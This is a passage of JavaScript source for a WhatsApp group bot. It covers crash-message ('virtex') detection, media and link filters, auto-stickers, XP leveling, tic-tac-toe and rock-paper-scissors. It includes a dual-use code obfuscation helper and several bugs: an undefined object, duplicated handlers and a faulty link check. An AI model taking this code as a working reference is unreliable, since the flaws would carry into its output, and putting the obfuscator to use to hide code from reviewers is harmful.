ThugBotInc.sendText(m.chat, `*Mark as read*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Bug sender 👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(ThugTheCreator) return
ThugBotInc.groupParticipantsUpdate(frommeky, [sender], 'remove')
await ThugBotInc.sendMessage(frommeky, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
ThugBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `*Greetings ${ownername}, wa.me/${sender.split("@")[0]} detected to have sent bugs/virtex/virus ${isGroup?`in ${groupName}`:''}*`})
 }
 }

if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmin || !isBotAdmin){		  
        } else {
          reply(`*[ BOT DETECTED ]*\n\n*User kicked out successfully!*"`)
    return await ThugBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ MEDIA DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected sending a media*\n*Media has been deleted successfully*\n*Media isn't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isThugMedia) {
    if(isThugMedia === "imageMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ IMAGE DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected sending an image*\n*Image deleted successfully*\n*Images aren't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isThugMedia) {
    if(isThugMedia === "videoMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ VIDEO DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected sending a video*\n*Video deleted successfully*\n*Videos aren't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isThugMedia) {
    if(isThugMedia === "stickerMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ STICKER DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} had been detected sending a sticker*\n*Sticker deleted successfully*\n*Stickers aren't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isThugMedia) {
    if(isThugMedia === "audioMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ AUDIO DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected sending an audio*\n*Audio deleted successfully*\n*Audio isn't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isThugMedia) {
    if(isThugMedia === "pollCreationMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ POLL DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected sending a poll*\n*Deleted Successfully*\n*Polls aren't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isThugMedia) {
    if(isThugMedia === "locationMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ LOCATION DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected sending a location message*\n*Location  messages aren't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isThugMedia) {
    if(isThugMedia === "documentMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ DOCUMENTS DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected sending a file/document*\n*Documents/files aren't allowed in current group, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isThugMedia) {
    if(isThugMedia === "contactMessage"){
        if (ThugTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`*[ CONTACT DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} detected sending a contact message*\n*Contacts aren't allowed in current group chat, sorry* 👀`)
    return ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  ThugBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`*[ BAD WORD DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} has been detected using a bad word*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                ThugBotInc.sendImageAsSticker(frommeky, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                ThugBotInc.sendVideoAsSticker(frommeky, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`*[ GROUP CHAT LINK DETECTED ]*\`\`\`\n\n*Link has been detected*\n*Members aren't allowed to send links, only admins have that privilege*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (ThugTheCreator) return reply(bvl)
               await ThugBotIncreply.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`*[ GROUP CHAT LINK DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} sent a link, deletion done*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`[ LINK DETECTED ]\`\`\`\n\n*Link detected*\n*Link not deleted because of admin privileges*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (ThugTheCreator) return reply(bvl)
               await ThugBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`[ LINK DETECTED ]\`\`\`\n\n*@${m.sender.split("@")[0]} sent a link, deletion done*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        // Handle Link Detection
        if (db.data.chats[m.chat].antilinkgc && body.match(/chat.whatsapp.com/)) {
            let bvl = `*[ GROUP CHAT LINK DETECTED ]*\n\nLink has been detected. Members aren't allowed to send links.`;
            if (isAdmins || m.key.fromMe || ThugTheCreator) return reply(bvl);
            await ThugBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
            ThugBotInc.sendMessage(m.chat, { text: `[ LINK DETECTED ]\n\n@${m.sender.split("@")[0]} sent a link, deletion done`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
        }
        if (db.data.chats[m.chat].antiyoutube) {
            if (budy.match(`https://youtu.be/`)) {
               bvl = `\`\`\`*[ YOUTUBE LINK DETECTED ]*\`\`\`\n\n*Link has been detected*\n*Members aren't allowed to send links, only admins have that privilege*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (ThugTheCreator) return reply(bvl)
               await ThugBotIncreply.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`*[ YOUTUBE LINK DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} sent a link, deletion done*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antifacebook) {
            if (budy.match(`facebook.com`)) {
               bvl = `\`\`\`*[ FACEBOOK LINK DETECTED ]*\`\`\`\n\n*Link has been detected*\n*Members aren't allowed to send links, only admins have that privilege*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (ThugTheCreator) return reply(bvl)
               await ThugBotIncreply.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`*[ FACEBOOK LINK DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} sent a link, deletion done*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat]. antitelegram) {
            if (budy.match(`https://t.me/`)) {
               bvl = `\`\`\`*[ TELEGRAM LINK DETECTED ]*\`\`\`\n\n*Link has been detected*\n*Members aren't allowed to send links, only admins have that privilege*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (ThugTheCreator) return reply(bvl)
               await ThugBotIncreply.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`*[ TELEGRAM LINK DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} sent a link, deletion done*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antitwitter) {
            if (budy.match(`x.com`)) {
               bvl = `\`\`\`*[ TWITTER LINK DETECTED ]*\`\`\`\n\n*Link has been detected*\n*Members aren't allowed to send links, only admins have that privilege*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (ThugTheCreator) return reply(bvl)
               await ThugBotIncreply.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`*[ TWITTER LINK DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} sent a link, deletion done*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antitiktok) {
            if (budy.match(`tiktok.com`)) {
               bvl = `\`\`\`*[ TIKTOK LINK DETECTED ]*\`\`\`\n\n*Link has been detected*\n*Members aren't allowed to send links, only admins have that privilege*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (ThugTheCreator) return reply(bvl)
               await ThugBotIncreply.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ThugBotInc.sendMessage(frommeky, {text:`\`\`\`*[ TIKTOK LINK DETECTED ]*\`\`\`\n\n*@${m.sender.split("@")[0]} sent a link, deletion done*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }

// Premium
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `꧁𝕿𝖍𝖚𝖌𝖓𝖎𝖋𝖎𝖈𝖊𝖓𝖙 𒆜𓊉꧂ 𓃠`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
async function replyprem(teks) {
    reply(`*Premium users only!*`);
}

// Owner function
async function replyowner(teks) {
    reply(`*Owner Only!*`);
}

// Admin function
async function replyadmin(teks) {
    reply(`*Admins only!*`);
}

// Private chats function
async function replyprivates(teks) {
    reply(`*Private Chats Only!*`);
}

// Loading function
async function loading() {
    // Define the loading progress array
    const xeonlod = [
        "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
        "《 ████▒▒▒▒▒▒▒▒》30%",
        "《 ███████▒▒▒▒▒》50%",
        "《 ██████████▒▒》80%",
        "《 ████████████》100%",
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴"
    ];

    // Send the initial loading message
    let { key } = await ThugBotInc.sendMessage(frommeky, {text: '𝙻𝙾𝙰𝙳𝙸𝙽𝙶....'})

for (let i = 0; i < xeonlod.length; i++) {
await ThugBotInc.sendMessage(frommeky, {text: xeonlod[i], edit: key })
}
}
async function loading2() {
    // Define the loading progress array
    const xeonlod = [
        "𝚃𝙷𝙸",
        "𝚃𝙷𝙸𝚂 𝚆𝙾𝚁",
        "𝚃𝙷𝙸𝚂 𝚆𝙾𝚁𝙻𝙳",
        "𝚃𝙷𝙸𝚂 𝚆𝙾𝚁𝙻𝙳 𝚂𝙷𝙰",
        "𝚃𝙷𝙸𝚂 𝚆𝙾𝚁𝙻𝙳 𝚂𝙷𝙰𝙻𝙻",
        "𝚃𝙷𝙸𝚂 𝚆𝙾𝚁𝙻𝙳 𝚂𝙷𝙰𝙻𝙻 𝙺𝙽𝙾𝚆",
        "𝚃𝙷𝙸𝚂 𝚆𝙾𝚁𝙻𝙳 𝚂𝙷𝙰𝙻𝙻 𝙺𝙽𝙾𝚆 𝙿𝙰𝙸𝙽",
        "𝚃𝙷𝙸𝚂 𝚆𝙾𝚁𝙻𝙳 𝚂𝙷𝙰𝙻𝙻 𝙺𝙽𝙾𝚆 𝙿𝙰𝙸𝙽 ︎𓅓𖤍"
    ];

    // Send the initial loading message
    let { key } = await ThugBotInc.sendMessage(frommeky, {text: '𖤍𖤍'})

for (let i = 0; i < xeonlod.length; i++) {
await ThugBotInc.sendMessage(frommeky, {text: xeonlod[i], edit: key })
}
}


// Bot admin function
async function replybotadmin(teks) {
    reply(`*Bot must be an admin!*`);
}

// Group function
async function replygroup(teks) {
    reply(`*Bot must be an admin!*`);
}

// Reply function
const reply = async (teks) => {
  try {
    await ThugBotInc.sendMessage(m.chat, {
      document: fs.readFileSync("./package.json"),
      fileName: 'ᎧᏒᏋᏦᎥ Ꮙ2 🌼🕊️',
      mimetype: 'application/zip',
      jpegThumbnail: fs.readFileSync("./T-Media/Oreki.jpg"),
      caption: teks,
      sourceUrl: "https://whatsapp.com/channel/0029VaoOiuwDp2QH070eTE01",
    }, { quoted: fstatus });
  } catch (error) {
    console.error("Error sending message:", error);
  }
};

const isLeveling = m.isGroup ? _leveling.includes(from) : false
//leveling
            const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
               }
            }

            const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
                }
            }

            const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
                }
             }

            const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
                }
            }

            const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
                }
            }

            const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }

            const getUserRank = (userId) => {
    let position = null
    let found = false
    _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
    Object.keys(_level).forEach((i) => {
        if (_level[i].id === userId) {
            position = i
            found = true
        }
    })
    if (found === false && position === null) {
        const obj = { id: userId, xp: 0, level: 1 }
        _level.push(obj)
        fs.writeFileSync('./database/level.json', JSON.stringify(_level))
        return 99
    } else {
        return position + 1
    }
}

const xpGain = new Set()

const isGained = (userId) => {
    return !!xpGain.has(userId)
}

const addCooldown = (userId) => {
    xpGain.add(userId)
    setTimeout(() => {
        return xpGain.delete(userId)
    }, 60000) // Every minute
}

var levelRole = getLevelingLevel(m.sender);
var role = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf I';

if (levelRole <= 5) {
    role = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf II';
} else if (levelRole <= 10) {
    role = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf III';
} else if (levelRole <= 15) {
    role = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf IV';
} else if (levelRole <= 20) {
    role = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf V';
} else if (levelRole <= 25) {
    role = '🧌 Troll I';
} else if (levelRole <= 30) {
    role = '🧌 Troll II';
} else if (levelRole <= 35) {
    role = '🧌 Troll III';
} else if (levelRole <= 40) {
    role = ' 🧌 Troll IV';
} else if (levelRole <= 45) {
    role = '🧌 Troll V';
} else if (levelRole <= 50) {
    role = '🐺 Werewolf I';
} else if (levelRole <= 55) {
    role = '🐺 Werewolf II';
} else if (levelRole <= 60) {
    role = '🐺 Werewolf III';
} else if (levelRole <= 65) {
    role = '🐺 Werewolf IV';
} else if (levelRole <= 70) {
    role = '🐺 Werewolf V';
} else if (levelRole <= 75) {
    role = '🧚 Fairy I';
} else if (levelRole <= 80) {
    role = '🧚 Fairy II';
} else if (levelRole <= 85) {
    role = '🧚 Fairy III';
} else if (levelRole <= 90) {
    role = '🧚 Fairy IV';
} else if (levelRole <= 95) {
    role = '🧚 Fairy V';
} else if (levelRole < 100) {
    role = '🧙 Wizard';
} else {
    role = '👼 god';
}

var levelRoles = getLevelingLevel(m.sender);
var roles = '.𖥔 🧝🏻‍♀️ ݁ ˖ I';

if (levelRoles <= 5) {
    roles = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf II';
} else if (levelRoles <= 10) {
    roles = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf III';
} else if (levelRoles <= 15) {
    roles = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf IV';
} else if (levelRoles <= 20) {
    roles = '.𖥔 🧝🏻‍♀️ ݁ ˖ Elf V';
} else if (levelRoles <= 25) {
    roles = '🧌 Troll I';
} else if (levelRoles <= 30) {
    roles = '🧌 Troll II';
} else if (levelRoles <= 35) {
    roles = '🧌 Troll III';
} else if (levelRoles <= 40) {
    roles = '🧌 Troll IV';
} else if (levelRoles <= 45) {
    roles = '🧌 Troll V';
} else if (levelRoles <= 50) {
    roles = '🐺 Werewolf I';
} else if (levelRoles <= 55) {
    roles = '🐺 Werewolf II';
} else if (levelRoles <= 60) {
    roles = '🐺 Werewolf III';
} else if (levelRoles <= 65) {
    roles = '🐺 Werewolf IV';
} else if (levelRoles <= 70) {
    roles = '🐺 Werewolf V';
} else if (levelRoles <= 75) {
    roles = '🧚 Fairy I';
} else if (levelRoles <= 80) {
    roles = '🧚 Fairy II';
} else if (levelRoles <= 85) {
    roles = '🧚 Fairy III';
} else if (levelRoles <= 90) {
    roles = '🧚 Fairy IV';
} else if (levelRoles <= 95) {
    roles = '🧚 Fairy V';
} else if (levelRoles < 100) {
    roles = '🧙 Wizard';
} else {
    roles = '👼 god';
}





        // leveling function
                        if (m.isGroup && isLeveling && isUser && ThugBotInc.public) {
                                const currentLevel = getLevelingLevel(m.sender)
                                const checkId = getLevelingId(m.sender)
                                try {
                                        addCooldown(m.sender)
                                        if (currentLevel === undefined && checkId === undefined) addLevelingId(m.sender)
                                        const amountXp = Math.floor(Math.random() * 10) + 200
                                        const requiredXp = 200 * (Math.pow(2, currentLevel) - 1)
                                        const getLevel = getLevelingLevel(m.sender)
                                        addLevelingXp(m.sender, amountXp)
                                        if (requiredXp <= getLevelingXp(m.sender)) {
                                        addLevelingLevel(m.sender, 1)
teks = `╔═══════ ༻❁༺ ═══════╗
        *「🥳  LEVEL UP 🥳 」*
╚═══════ ༻❁༺ ═══════╝\n──────────────────\n*Name:  @${m.sender.split("@")[0]}*\n*XP: ${getLevelingXp(m.sender)}*\n*Level: ${getLevel} → ${getLevelingLevel(m.sender)}*\n*Role: ${role}*\n──────────────────\n*Congrats, you're leveling up!* 🥳🥳\n──────────────────
`
ThugBotInc.sendMessage(m.chat, {text: teks, mentions:[m.sender]}, {quoted:m})
}

                        } catch (err) {
                                console.error(err)
                        }
                }
                if (prefix && command) {
                                const currentLevel = getLevelingLevel(m.sender)
                                const checkId = getLevelingId(m.sender)
                                try {
                                        
                                        if (currentLevel === undefined && checkId === undefined) addLevelingId(m.sender)
                                        const amountXp = Math.floor(Math.random() * 10) + 30
                                        const requiredXp = 30 * (Math.pow(2, currentLevel) - 1)
                                        const getLevel = getLevelingLevel(m.sender)
                                        addLevelingXp(m.sender, amountXp)
                                        if (requiredXp <= getLevelingXp(m.sender)) {
                                        addLevelingLevel(m.sender, 1)
                                        }
                                        
                        } catch (err) {
                                console.error(err)
                        }
                }
                 //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) ThugBotInc.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            ThugBotInc.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    ThugBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    ThugBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) ThugBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) ThugBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) ThugBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    ThugBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) ThugBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) ThugBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    ThugBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
if (m.message && m.isGroup) {
    console.log(
        chalk.cyan(
            `\n< ================================================== >\n`
        )
    );
    console.log(chalk.green(`Group Chat:`));
    console.log(
        chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(body || m.mtype)) +
        "\n" +
        chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
        chalk.green(groupName, m.chat)
    );
} else {
    console.log(
        chalk.cyan(
            `\n< ================================================== >\n`
        )
    );
